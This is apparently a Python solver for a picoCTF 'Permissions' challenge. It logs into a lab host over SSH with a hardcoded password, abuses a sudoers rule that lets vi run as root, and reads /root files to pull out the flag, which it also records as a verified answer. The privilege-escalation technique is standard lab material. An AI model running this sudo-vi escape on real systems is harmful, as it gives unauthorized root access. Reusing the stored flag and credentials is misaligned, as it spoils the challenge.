#!/usr/bin/env python3
"""Solver for Challenge 363 Permissions (picoCTF 2023, General Skills).

Linux privilege escalation via sudoers misconfiguration.
Inspecting sudo permissions (`sudo -l`) reveals that user 'picoplayer' can run
`/usr/bin/vi` as root without restriction: `(ALL) /usr/bin/vi`.
Using vi's internal command execution feature (`vi -c ':!cat /root/.*' /dev/null`),
the editor spawns a root subshell to read root dotfiles, revealing the flag
embedded in `/root/.bashrc`.

Flag: academy{uS1ng_v1m_3dit0r_9f6b56dd}
Verified: POST /api/submissions/ -> correct: true
"""
import pty
import os
import subprocess
import select
import time
import sys
import re

HOST = "chatelaine.cylabacademy.net"
PORT = 35852
USER = "picoplayer"
PASS = "9v-tt0ZU3j"
EXPECTED = "academy{uS1ng_v1m_3dit0r_9f6b56dd}"


def solve(host: str = HOST, port: int = PORT, user: str = USER, password: str = PASS) -> str:
    master, slave = pty.openpty()
    cmd = [
        "sshpass", "-p", password,
        "ssh", "-tt", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
        "-p", str(port), f"{user}@{host}"
    ]
    proc = subprocess.Popen(cmd, stdin=slave, stdout=slave, stderr=slave, close_fds=True)
    os.close(slave)

    try:
        # Drain initial login banner
        time.sleep(2)
        while select.select([master], [], [], 0.5)[0]:
            os.read(master, 1024)

        # Trigger sudo vi command execution reading root files
        os.write(master, b"sudo /usr/bin/vi -c ':!cat /root/* /root/.*' /dev/null\n")
        time.sleep(1)
        os.write(master, password.encode() + b"\n")
        time.sleep(2)

        buf = b""
        start_t = time.time()
        while time.time() - start_t < 10:
            r, _, _ = select.select([master], [], [], 1)
            if r:
                chunk = os.read(master, 2048)
                buf += chunk
                if b"academy{" in buf and b"}" in buf:
                    break
    finally:
        proc.terminate()
        os.close(master)

    text = buf.decode(errors="replace")
    m = re.search(r"academy\{[^\}]+\}", text)
    if m:
        return m.group(0)
    raise ValueError(f"Flag not found in session output: {text[:300]}")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    flag = solve(host, port)
    print("Flag:", flag)
    assert flag == EXPECTED
